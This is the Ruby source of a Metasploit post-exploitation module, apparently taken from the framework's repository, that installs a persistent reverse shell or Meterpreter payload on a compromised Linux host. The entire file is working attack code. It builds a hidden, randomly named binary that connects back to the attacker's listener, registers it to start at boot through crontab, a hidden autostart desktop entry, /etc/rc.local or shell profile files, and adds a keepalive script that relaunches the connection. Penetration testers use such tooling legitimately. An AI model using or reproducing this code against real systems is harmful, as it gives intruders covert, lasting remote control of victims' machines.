# $Id: checkvm.rb 14812 2012-02-26 08:11:04Z rapid7 $
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix'
require 'msf/core/post/persistence'
require 'msf/core/post/linux/priv'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Unix
	include Msf::Post::Persistence
	include Msf::Post::Linux::Priv
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Manage Persistent Payload Installer for linux',
			'Description'   => %q{
				This Module will create a boot persistent reverse Meterpreter or Shell session by
				installing on the target host the payload that will be executed
				at system startup through one of the following 4 methods. 1) By using crontab subsystem,
				this is the recomended method. 2) Through Autostart feature as described by freedesktop.org.
				3) By adding an entry in the rc.local launched by init. 4) By adding an entry
				 in the user shell profile file. 

				REXE mode will transfer a binary of your choosing to remote host to be
				used as a payload.
				KEEPALIVE is done through a bash script
				},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Alexandre Maloteaux <alex_maloteaux[at]metasploit.com>'],
					#based on the windows persistence post module
			'Version'       => '$Revision: 14812 $',
			'Platform'      => [ 'linux'],
			'SessionTypes'  => [ 'shell' ] #meterpreter sessions need "Bug #6825 : Creating a second tcp channel fails" to be resolved
			))

		register_options(
			[
				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter or Shell. (Meterpreter works only on linux x86)', 'SHELL',['SHELL','METERPRETER']]),
				OptEnum.new('STARTUP_TYPE', [true, 'crontab, autostart or init file .', 'CRONTAB',['CRONTAB','AUTOSTART','INIT','PROFILE']]),
			], self.class)

	end


	def run

		rexe = datastore['REXE']
		@rexename = datastore['REXENAME'] 
		@rexename = ".tmp_" + ::Rex::Text.rand_text_alpha((rand(4)+6)) if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
		
		@lhost = datastore['LHOST']
		@lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		encoder = datastore['ENCODER']
		iterations = datastore['ITERATIONS']
		@host,@port = session.session_host, session.session_port

		@arch = ''
		@homedir = get_home_dir()
		@use_home_dir = true
		@startup_type = datastore['STARTUP_TYPE']
		@is_root = false

		@mode = 'payload'
		bin = ''

		return unless check_arch

		unless datastore['ENCODER'].nil? or datastore['ENCODER'].empty?
			print_error("Warning : Using an encoder is not recommended on this platform, test carefully first")
		end

		unless datastore['TEMPLATE'].nil? or datastore['TEMPLATE'].empty?
			print_error("Warning : Using a template is not recommended on this platform, test carefully first")
		end

		unless datastore['REXEPATH'].nil? or datastore['REXEPATH'].empty?
			@use_home_dir = false;
			rexepath = ::File.expand_path(datastore['REXEPATH'])
			if not directory_exist? rexepath
				print_error("The directory #{datastore['REXEPATH']} does not exists on the remote system")
				return
			end
		end

		if is_root?
			@is_root = true
			print_status("root session detected")
		end

		unless datastore['REXE'].nil? or datastore['REXE'].empty?
			@mode = 'rexe'
			if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
				print_error("Please define REXENAME")
				return
			end

			if not ::File.exist?(datastore['REXE'])
				print_error("Rexe file does not exist!")
				return
			end

			bin = create_payload_from_file(rexe)
		else
			# Check that if a template is provided that it actually exists
			if datastore['TEMPLATE']
				if not ::File.exists?(datastore['TEMPLATE'])
					print_error "Template File does not exists!"
					return
				else
					template_bin = datastore['TEMPLATE']
				end
			end

			if datastore['PAYLOAD_TYPE'] == 'SHELL'
				payload = "linux/#{@arch}/shell/reverse_tcp"
			else #meterpreter
				if @arch == 'x64'
					print_error("Meterpreter payload are not suported on x64 platform")
					return
				end
				payload = "linux/x86/meterpreter/reverse_tcp"
			end
			
			# Create payload and bin
			print_status("Payload type : #{payload}")
			pay = create_payload(payload, @lhost, @lport, opts = "")
			return if not pay # payload not implemented
			raw = pay_gen(pay,encoder, iterations)
			bin = create_bin(template_bin, raw)
		end

		binpath = write_unix_bin_to_target(bin, @rexename)

		unless make_persistent(binpath)
			return 
		end

		# Start handler if set
		if @mode == 'payload'
			create_multihand(payload, @lhost, @lport) if datastore['HANDLER']
		else
			print_error("Handler won't be started in this mode") if datastore['HANDLER'] == true
		end

		# Initial execution of bin file
		if datastore['EXECUTE']
			target_shell_exec(binpath) 
		end
		return
	end



	# Function for Creating persistent Bin
	#-------------------------------------------------------------------------------
	def create_bin(altbin, raw)

		if not altbin.nil?
			bin = eval( "::Msf::Util::EXE.to_linux_#{@arch}_elf(session.framework, raw, {:template => altbin})")
		else
			bin = eval( "::Msf::Util::EXE.to_linux_#{@arch}_elf(session.framework, raw, {})")
		end
		print_status("Persistent agent file is #{bin.length} bytes long")
		return bin
	end


	# Function to make the binary file persistent
	# Warning : on some system like OEL crontab may not be in PATH 
	#-------------------------------------------------------------------------------
	def make_persistent(binpath)
		if datastore['KEEPALIVE'] and @mode == 'payload'
			if datastore['RBATCHNAME'].nil? or datastore['RBATCHNAME'].empty?
				batchfilename = '.tmp_' + ::Rex::Text.rand_text_alpha((rand(4)+6)) 
			else
				batchfilename = datastore['RBATCHNAME']
			end
			# Another way then netstat would be to use $! and grep on the pid ...
			bashscript = %Q|#!/bin/sh
			while true; do 
			if /bin/netstat -etn \| /bin/egrep  "(.)*#{@lhost}:#{@lport} (.)*" >/dev/null 
			then
				sleep #{datastore['DELAY']}
			else
				#{binpath}&
				sleep #{datastore['DELAY']}
			fi
			done
			|	
			bashscript.gsub!(/^\t\t\t/, '')
			bashscriptpath = write_unix_bin_to_target(bashscript, batchfilename, true)
			path_for_file = bashscriptpath
		else
			path_for_file = binpath
		end

		case @startup_type
		when 'CRONTAB'
			cmd_exec('crontab -l | { cat; echo "@reboot ' + path_for_file + '"; }  | crontab - ')
			print_status("Cron job added upon reboot")

		when 'AUTOSTART'
			unless is_X_running?
				print_error("It looks like there is no X server running")
				return false
			end

			# TODO : (really not common , tested on Debian , OEL 5.5 , Ubuntu ) 
			# Upon Desktop Application Autostart Specification (http://standards.freedesktop.org/autostart-spec/autostart-spec-latest.html)
			# If $XDG_CONFIG_HOME is not set the Autostart Directory in the user's home directory is ~/.config/autostart/
			# If $XDG_CONFIG_DIRS is not set the system wide Autostart Directory is /etc/xdg/autostart/
			# If $XDG_CONFIG_HOME and $XDG_CONFIG_DIRS are not set and the two files /etc/xdg/autostart/foo.desktop and ~/.config/autostart/foo.desktop exist then only the 			# file ~/.config/autostart/foo.desktop will be used because ~/.config/autostart/ is more important than /etc/xdg/autostart/ 
			if @is_root
				autostart_path = '/etc/xdg/autostart/'
				unless directory_exist? autostart_path
					print_error("xdg path do not exists : #{autostart_path}")
					return false
				end
				#This is mandatory cause file in /root won't be launched
				if datastore['REXEPATH'].nil? or datastore['REXEPATH'].empty?
					old_path_for_file = path_for_file
					path_for_file = '/usr/lib/' + @rexename
					cmd_exec('mv ' + old_path_for_file + ' ' + path_for_file )
					print_status("This mode require the file to be moved outside of /root ( from #{old_path_for_file} to #{path_for_file})")
				end

			else
				autostart_path = ::File.join(@homedir, '.config', 'autostart')
				#some distribution like OEL do not create it by default
				unless directory_exist? autostart_path
					cmd_exec('mkdir -p ' + autostart_path)
				end
			end
			autostart_file = ::File.join(autostart_path, ::Rex::Text.rand_text_alpha((rand(4)+6)) + '.desktop' )
			desktop_file = %Q|
			[Desktop Entry]
			Name=#{::Rex::Text.rand_text_alpha((rand(4)+6))}
			Exec=#{path_for_file}
			Terminal=false
			Type=Application
			NoDisplay=true
			|
			desktop_file.gsub!(/^\t\t\t/, '')
			write_file(autostart_file, desktop_file)
			print_status("Autostart desktop file added : #{autostart_file}")

		when 'INIT'
			unless @is_root
				print_error("Only root user is allowded for this startup type")
				return false
			end

			rc_temp = '/etc/rc.local' + ::Rex::Text.rand_text_alpha((rand(4)+6))
			cmd_exec('cp /etc/rc.local ' + rc_temp)
			cmd_exec('echo "#!/bin/sh" > /etc/rc.local' )
			cmd_exec('echo "' + path_for_file + '&" >> /etc/rc.local' )
			cmd_exec('cat  ' + rc_temp + ' >> /etc/rc.local' )
			cmd_exec('rm  ' + rc_temp  )
			print_status("Entry added in /etc/rc.local")

		when 'PROFILE'
			shell = get_user_shell
			print_status("User shell is #{shell}")

			profile_file = ::File.join(@homedir, '.profile')
			profile_file_temp = ::File.join(@homedir, '.profile') + ::Rex::Text.rand_text_alpha((rand(4)+6)) 
			case shell 
			when  'bash'
				# login shell won't call bashrc must most distribution will call it from .profile or .bash_profile
				# (gdm login will call .profile but .bashrc won't be called due to some internal check in .profile (Debian))
				profile_file = ::File.join(@homedir, '.bashrc')
			when  'zsh'
				#read at beginning of execution by each shell (login or interactive)
				profile_file = ::File.join(@homedir, '.zshrc')
			when  'csh'
				#read at beginning of execution by each shell (login or interactive)
				profile_file = ::File.join(@homedir, '.cshrc')
			when /(^sh$)|(^ksh$)/
				# only interactive shell upon man page but looks like login shell use it too (Debian)
				profile_file = ::File.join(@homedir, '.kshrc')
			when 'sh'
				profile_file = ::File.join(@homedir, '.profile')
			else
				print_error("This shell has not been tested with this module")
				profile_file = ::File.join(@homedir, '.profile')
			end
			if file_exist? profile_file
				cmd = 'cat ' + profile_file + ' | { echo "' + path_for_file + '&"; cat; } | cat > ' + profile_file_temp
				cmd_exec(cmd)
				cmd_exec('mv ' + profile_file_temp + ' ' + profile_file)
			else
				cmd = 'echo "' + path_for_file + '&" > ' + profile_file
				cmd_exec(cmd)
			end
			print_status("Payload path injected inside #{profile_file}")
		end
		true
	end

	def check_arch
		@arch = get_arch
		unless @arch == 'x86' or @arch == 'x64'
			print_error("This architecture is not suported with this module (#{@arch})")
			return false
		end
		return true
	end

end

